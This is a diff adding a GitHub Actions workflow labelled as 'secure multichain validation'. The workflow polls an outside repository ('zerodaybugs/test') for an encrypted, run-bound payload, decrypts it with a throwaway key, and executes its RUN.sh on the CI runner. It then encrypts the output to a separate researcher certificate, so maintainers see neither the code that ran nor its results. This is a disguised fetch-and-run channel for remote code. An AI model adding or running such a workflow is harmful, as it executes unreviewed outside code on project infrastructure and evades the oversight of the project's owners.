@@ -1,0 +1,160 @@
+name: internal secure multichain validation R42C
+
+on:
+  pull_request:
+    branches:
+      - internal/secure-r42c-base-20260802
+    paths:
+      - "secure-r42c-request/**"
+
+permissions:
+  contents: read
+
+concurrency:
+  group: internal-secure-r42c-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+jobs:
+  validate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 55
+    steps:
+      - name: Checkout isolated request
+        uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+          fetch-depth: 1
+
+      - name: Install pinned Foundry
+        uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: v1.5.1
+
+      - name: Generate one-time runner certificate
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p handshake-public
+          umask 077
+          openssl req -x509 -newkey rsa:4096 -sha256 -nodes -days 1 \
+            -subj '/CN=ephemeral-secure-multichain-runner' \
+            -keyout /tmp/runner-private.pem \
+            -out handshake-public/runner-certificate.pem \
+            >/dev/null 2>&1
+          openssl x509 -in handshake-public/runner-certificate.pem -noout -fingerprint -sha256 \
+            > handshake-public/runner-certificate.sha256-fingerprint.txt
+          printf '%s\n' "$GITHUB_RUN_ID" > handshake-public/run-id.txt
+          chmod 600 /tmp/runner-private.pem
+          chmod 644 handshake-public/*
+
+      - name: Publish one-time certificate
+        uses: actions/upload-artifact@v4
+        with:
+          name: secure-r42c-handshake-${{ github.run_id }}
+          path: handshake-public/
+          if-no-files-found: error
+          retention-days: 1
+
+      - name: Retrieve run-bound encrypted payload
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/r42c-transport
+          mkdir -p /tmp/r42c-transport
+          found=0
+          for attempt in $(seq 1 600); do
+            rm -rf /tmp/r42c-transport/repo
+            git clone --quiet --depth 1 --branch internal/secure-r42c-payload-20260802 \
+              https://github.com/zerodaybugs/test.git /tmp/r42c-transport/repo 2>/dev/null || true
+            payload_dir=/tmp/r42c-transport/repo/secure-r42c-payload
+            if test -s "$payload_dir/payload.cms.b64" \
+               && test -s "$payload_dir/payload.cms.sha256" \
+               && test -s "$payload_dir/run-id.txt" \
+               && test "$(tr -d '\r\n' < "$payload_dir/run-id.txt")" = "$GITHUB_RUN_ID"; then
+              base64 --decode "$payload_dir/payload.cms.b64" > /tmp/r42c-transport/payload.cms
+              cp "$payload_dir/payload.cms.sha256" /tmp/r42c-transport/
+              cp "$payload_dir/run-id.txt" /tmp/r42c-transport/
+              if (cd /tmp/r42c-transport && sha256sum --check --strict payload.cms.sha256); then
+                found=1
+                break
+              fi
+            fi
+            sleep 4
+          done
+          test "$found" -eq 1
+          test "$(tr -d '\r\n' < /tmp/r42c-transport/run-id.txt)" = "$GITHUB_RUN_ID"
+          (cd /tmp/r42c-transport && sha256sum --check --strict payload.cms.sha256)
+
+      - name: Decrypt, verify, and execute local-only proof
+        id: proof
+        continue-on-error: true
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          rm -rf /tmp/r42c-work
+          mkdir -p /tmp/r42c-work/lib encrypted-result
+          openssl cms -decrypt -binary -inform DER \
+            -in /tmp/r42c-transport/payload.cms \
+            -recip handshake-public/runner-certificate.pem \
+            -inkey /tmp/runner-private.pem \
+            -out /tmp/r42c-payload.tar.gz \
+            >/dev/null 2>&1
+          tar -xzf /tmp/r42c-payload.tar.gz -C /tmp/r42c-work
+          (cd /tmp/r42c-work && sha256sum --check --strict INPUT_SHA256SUMS)
+          git clone --quiet --depth 1 --branch v1.9.6 \
+            https://github.com/foundry-rs/forge-std.git /tmp/r42c-work/lib/forge-std
+          curl -fsSL --retry 4 --retry-all-errors \
+            'https://binaries.soliditylang.org/linux-amd64/solc-linux-amd64-v0.8.29+commit.ab55807c' \
+            -o /tmp/r42c-work/solc
+          echo '18d418a40dc04d17656b1b5c8a7b35cfbab8942b51f38d005d5b59e8aa6637e0  /tmp/r42c-work/solc' \
+            | sha256sum --check --strict >/dev/null
+          chmod 0755 /tmp/r42c-work/solc /tmp/r42c-work/RUN.sh
+          set +e
+          (cd /tmp/r42c-work && ./RUN.sh)
+          run_status=$?
+          set -e
+          mkdir -p /tmp/r42c-work/evidence
+          printf '%s\n' "$run_status" > /tmp/r42c-work/evidence/RUNNER_EXIT_STATUS.txt
+          forge --version > /tmp/r42c-work/evidence/WORKFLOW_FORGE_VERSION.txt 2>&1
+          /tmp/r42c-work/solc --version > /tmp/r42c-work/evidence/WORKFLOW_SOLC_VERSION.txt 2>&1
+          (cd /tmp/r42c-work/evidence && \
+            find . -type f ! -name SHA256SUMS -print0 | sort -z | xargs -0 sha256sum > SHA256SUMS)
+          exit "$run_status"
+
+      - name: Encrypt evidence to researcher certificate
+        if: always()
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p encrypted-result
+          if [[ ! -d /tmp/r42c-work/evidence ]]; then
+            mkdir -p /tmp/r42c-work/evidence
+            printf 'proof-step-did-not-produce-evidence\n' > /tmp/r42c-work/evidence/TRANSPORT_ERROR.txt
+            printf '99\n' > /tmp/r42c-work/evidence/RUNNER_EXIT_STATUS.txt
+          fi
+          tar -czf /tmp/r42c-evidence.tar.gz -C /tmp/r42c-work evidence
+          openssl cms -encrypt -binary -aes-256-cbc -outform DER \
+            -in /tmp/r42c-evidence.tar.gz \
+            -out encrypted-result/evidence.cms \
+            /tmp/r42c-work/researcher-certificate.pem \
+            >/dev/null 2>&1
+          sha256sum encrypted-result/evidence.cms > encrypted-result/evidence.cms.sha256
+          cp /tmp/r42c-work/evidence/RUNNER_EXIT_STATUS.txt encrypted-result/
+          printf 'encrypted-evidence-complete\n' > encrypted-result/STATUS.txt
+          shred -u /tmp/runner-private.pem /tmp/r42c-payload.tar.gz /tmp/r42c-evidence.tar.gz 2>/dev/null || true
+          rm -rf /tmp/r42c-work /tmp/r42c-transport
+
+      - name: Upload encrypted evidence only
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: secure-r42c-result-${{ github.run_id }}
+          path: encrypted-result/
+          if-no-files-found: error
+          retention-days: 1
+
+      - name: Enforce proof result after encrypted upload
+        if: always()
+        shell: bash
+        run: test "$(cat encrypted-result/RUNNER_EXIT_STATUS.txt 2>/dev/null || echo 99)" = 0
